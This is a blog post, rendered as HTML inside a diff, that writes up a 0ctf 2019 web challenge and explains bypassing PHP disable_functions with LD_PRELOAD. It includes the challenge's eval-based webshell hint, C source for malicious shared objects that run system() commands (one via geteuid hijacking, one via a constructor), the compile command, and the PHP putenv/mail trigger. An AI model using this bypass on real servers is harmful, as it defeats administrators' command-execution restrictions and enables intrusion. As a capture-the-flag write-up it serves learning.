@@ -1,23 +1,467 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://github.com/Windylh/image/raw/master/icon.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://github.com/Windylh/image/raw/master/icon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://github.com/Windylh/image/raw/master/icon.ico">
+  <link rel="mask-icon" href="https://github.com/Windylh/image/raw/master/icon.ico" color="#222">
 
-{% block title %}{{ page.title }} | {{ title }}{% endblock %}
+<link rel="stylesheet" href="/css/main.css">
 
-{% block page_class %}page-post-detail{% endblock %}
 
-{% block content %}
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
-  <div id="posts" class="posts-expand">
-    {{ post_template.render(page) }}
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="0x00 0ctf2019-Wallbreaker Easy在刚刚结束的0ctf中有一个Web题，提供了webshell，但是禁用了执行命令的函数。在查询资料的时候知道了可以通过LD_PRELOAD绕过disbale_functions的方法。学到的东西在这里记录一下。 0x01 Wallbreaker Easy Writeup首先记录一下这道题的解题过程。 index.php 1234567Im">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用LD_PRELOAD绕过disbale_functions">
+<meta property="og:url" content="http://yoursite.com/2019/03/26/%E5%88%A9%E7%94%A8LD_PRELOAD%E7%BB%95%E8%BF%87disbale_functions/index.html">
+<meta property="og:site_name" content="Windylh&#39;s blog">
+<meta property="og:description" content="0x00 0ctf2019-Wallbreaker Easy在刚刚结束的0ctf中有一个Web题，提供了webshell，但是禁用了执行命令的函数。在查询资料的时候知道了可以通过LD_PRELOAD绕过disbale_functions的方法。学到的东西在这里记录一下。 0x01 Wallbreaker Easy Writeup首先记录一下这道题的解题过程。 index.php 1234567Im">
+<meta property="og:locale">
+<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2019.3.25/web1.png">
+<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2019.3.25/web2.png">
+<meta property="article:published_time" content="2019-03-25T16:00:00.000Z">
+<meta property="article:modified_time" content="2019-03-27T00:54:26.948Z">
+<meta property="article:author" content="Windylh">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="php">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/Windylh/image/raw/master/2019.3.25/web1.png">
+
+<link rel="canonical" href="http://yoursite.com/2019/03/26/%E5%88%A9%E7%94%A8LD_PRELOAD%E7%BB%95%E8%BF%87disbale_functions/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>利用LD_PRELOAD绕过disbale_functions | Windylh's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
   </div>
 
-{% endblock %}
+  <div class="site-meta">
 
-{% block sidebar %}
-  {{ sidebar_template.render(true) }}
-{% endblock %}
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Windylh's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
 
-{% block script_extra %}
-  {% include '_scripts/pages/post-details.swig' %}
-{% endblock %}
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/26/%E5%88%A9%E7%94%A8LD_PRELOAD%E7%BB%95%E8%BF%87disbale_functions/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Windylh">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Windylh's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          利用LD_PRELOAD绕过disbale_functions
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2019-03-26 00:00:00" itemprop="dateCreated datePublished" datetime="2019-03-26T00:00:00+08:00">2019-03-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-03-27 08:54:26" itemprop="dateModified" datetime="2019-03-27T08:54:26+08:00">2019-03-27</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="0x00-0ctf2019-Wallbreaker-Easy"><a href="#0x00-0ctf2019-Wallbreaker-Easy" class="headerlink" title="0x00 0ctf2019-Wallbreaker Easy"></a>0x00 0ctf2019-Wallbreaker Easy</h2><p>在刚刚结束的0ctf中有一个Web题，提供了webshell，但是禁用了执行命令的函数。在查询资料的时候知道了可以通过<code>LD_PRELOAD</code>绕过<code>disbale_functions</code>的方法。学到的东西在这里记录一下。</p>
+<h2 id="0x01-Wallbreaker-Easy-Writeup"><a href="#0x01-Wallbreaker-Easy-Writeup" class="headerlink" title="0x01 Wallbreaker Easy Writeup"></a>0x01 Wallbreaker Easy Writeup</h2><p>首先记录一下这道题的解题过程。</p>
+<p>index.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Imagick is a awesome library for hackers to break `disable_functions`.</span><br><span class="line">So I installed php-imagick in the server, opened a `backdoor` for you.</span><br><span class="line">Let&#x27;s try to execute `/readflag` to get the flag.</span><br><span class="line">Open basedir: /var/www/html:/tmp/415c92e8be7c68409ca6bd369d87482f</span><br><span class="line">Hint: eval($_POST[&quot;backdoor&quot;]);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<p>index.php就是一句话木马，密码是<code>backdoor</code>。提示我们用<code>Imagick</code>插件绕过<code>disable_functions</code>，执行<code>/readflag</code>来获得flag。并给出了<code>open basedir</code>。</p>
+<p>首先查看一下<code>disable_functions</code>。payload:<code>backdoor=echo ini_get(&#39;disable_functions&#39;);</code></p>
+<p>除了默认设置禁用的pcntl的一系列函数还禁用了<code>system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail</code>。</p>
+<p>一开始去找了<code>Imagick</code>插件的漏洞，但都在当前版本中被修复了。之后看到了<code>LD_PRELOAD</code>利用<code>mail()</code>函数绕过<code>disable_functions</code>的方法。和<code>Imagick</code>结合，成功拿到了flag。</p>
+<h2 id="0x02-Sendmail-LD-PRELOAD绕过disable-functions"><a href="#0x02-Sendmail-LD-PRELOAD绕过disable-functions" class="headerlink" title="0x02 Sendmail+LD_PRELOAD绕过disable_functions"></a>0x02 Sendmail+LD_PRELOAD绕过disable_functions</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在 UNIX 的动态链接库的世界中，LD_PRELOAD 是一个有趣的环境变量，它可以影响程序运行时的链接，它允许你定义在程序运行前优先加载的动态链接库。</span><br></pre></td></tr></table></figure>
+
+<p>当程序运行时需要调用系统共享对象中的函数时，我们可以通过设置<code>LD_PRELOAD</code>来优先加载我们编写的恶意代码来劫持原本系统共享对象的代码。</p>
+<p>攻击过程：<br>1、生成含有恶意代码的动态链接程序。<br>2、运用<code>putenv</code>来设置<code>LD_PRELOAD</code>，优先调用我们编写的程序。<br>3、通过webshell触发函数。</p>
+<p>很多文章以sendmail为例子。利用<code>readelf -Ws /usr/sbin/sendmail</code>查看其调用的库函数，从中选择了<code>geteuid()</code>函数来劫持。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span>** environ;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">geteuid</span> <span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* cmdline = <span class="string">&quot;ls &gt; /var/www/html/test.txt&quot;</span>;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; environ[i]; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">&quot;LD_PRELOAD&quot;</span>)) &#123;</span><br><span class="line">                    environ[i][<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>程序运行，共享库的<code>geteuid()</code>被调用时，通过<code>system()</code>执行命令。</p>
+<p>在尽量和服务器相同的环境中将它编译为一个共享对象。</p>
+<p><code>gcc -shared -fPIC exp.c -o exp.so</code></p>
+<p>将<code>.so</code>文件传输到服务器中，运用php代码设置为<code>LD_PRELOAD</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=/var/www/exp.so&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&quot;admin@admin.com&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>此时在&#x2F;var&#x2F;www&#x2F;html&#x2F;目录下就会产生test.txt。</p>
+<p>因为利用了sendmail调用<code>geteuid()</code>，进行了劫持，所以没有安装sendmail时无法使用这个函数。</p>
+<p>在这道题中，并没有sendmail，也就无法劫持getuid()函数。</p>
+<h3 id="0x03-C-语言扩展修饰符-attribute-constructor"><a href="#0x03-C-语言扩展修饰符-attribute-constructor" class="headerlink" title="0x03 C 语言扩展修饰符 attribute((constructor))"></a>0x03 C 语言扩展修饰符 <strong>attribute</strong>((constructor))</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GNU C 的一大特色就是__attribute__ 机制。__attribute__ 可以设置函数属性（Function Attribute ）、变量属性（Variable Attribute ）和类型属性（Type Attribute ）。</span><br><span class="line"></span><br><span class="line">__attribute__ ((constructor))会使函数在main()函数之前被执行。</span><br></pre></td></tr></table></figure>
+
+<p>如果我们在我们的函数之前采用这个修饰符，那么程序在加载系统共享对象的时候会优先执行我们的函数，这样就可以不用对特定的函数进行劫持，直接绕过<code>disable_functions</code>。</p>
+<p>修改后的payload：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span>** environ;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="type">void</span> <span class="title function_">preload</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* cmdline = <span class="string">&quot;/readflag &gt; /tmp/415c92e8be7c68409ca6bd369d87482f/asd&quot;</span>;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; environ[i]; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">&quot;LD_PRELOAD&quot;</span>)) &#123;</span><br><span class="line">                    environ[i][<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>同时上传一个doc文件，用Imagick加载。</p>
+<p><img src="https://github.com/Windylh/image/raw/master/2019.3.25/web1.png"></p>
+<p>因为没有了特定函数劫持的限制，只要我们执行mail函数，不管有没有安装sendmail都可以直接绕过<code>disable_functions</code>。</p>
+<p><img src="https://github.com/Windylh/image/raw/master/2019.3.25/web2.png"></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><blockquote>
+<p><a href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html">PHP disable_functions Bypass 的方法探究</a><br><a href="https://www.cnblogs.com/hookjoy/p/10167315.html">无需sendmail：巧用LD_PRELOAD突破disable_functions</a><br><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD/blob/master/bypass_disablefunc.c">bypass_disablefunc_via_LD_PRELOAD&#x2F;bypass_disablefunc.c</a></p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Web/" rel="tag"># Web</a>
+              <a href="/tags/php/" rel="tag"># php</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2018/12/01/2018%E9%B9%8F%E5%9F%8E%E6%9D%AFWeb(%E9%83%A8%E5%88%86)Writeup/" rel="prev" title="2018鹏城杯myblog&shadow Writeup">
+      <i class="fa fa-chevron-left"></i> 2018鹏城杯myblog&shadow Writeup
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019/04/25/CVE-2017-3193%E5%A4%8D%E7%8E%B0/" rel="next" title="CVE-2017-3193复现">
+      CVE-2017-3193复现 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-0ctf2019-Wallbreaker-Easy"><span class="nav-number">1.</span> <span class="nav-text">0x00 0ctf2019-Wallbreaker Easy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-Wallbreaker-Easy-Writeup"><span class="nav-number">2.</span> <span class="nav-text">0x01 Wallbreaker Easy Writeup</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Sendmail-LD-PRELOAD%E7%BB%95%E8%BF%87disable-functions"><span class="nav-number">3.</span> <span class="nav-text">0x02 Sendmail+LD_PRELOAD绕过disable_functions</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-C-%E8%AF%AD%E8%A8%80%E6%89%A9%E5%B1%95%E4%BF%AE%E9%A5%B0%E7%AC%A6-attribute-constructor"><span class="nav-number">3.1.</span> <span class="nav-text">0x03 C 语言扩展修饰符 attribute((constructor))</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">4.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Windylh</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">35</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://blog.izilong.net/" title="http:&#x2F;&#x2F;blog.izilong.net&#x2F;" rel="noopener" target="_blank">Zilong's blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://p0sec.net/" title="https:&#x2F;&#x2F;p0sec.net&#x2F;" rel="noopener" target="_blank">p0's blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://p0desta.com/" title="http:&#x2F;&#x2F;p0desta.com&#x2F;" rel="noopener" target="_blank">p0desta's blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://mengsec.com/" title="https:&#x2F;&#x2F;mengsec.com&#x2F;" rel="noopener" target="_blank">Mengchen's blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://keysking.github.io/" title="https:&#x2F;&#x2F;keysking.github.io&#x2F;" rel="noopener" target="_blank">Keysking's blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://lanvnal.com/" title="http:&#x2F;&#x2F;lanvnal.com&#x2F;" rel="noopener" target="_blank">LANVNAL's blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://0sec.com.cn/" title="http:&#x2F;&#x2F;0sec.com.cn&#x2F;" rel="noopener" target="_blank">Fazx's blog</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Windylh</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
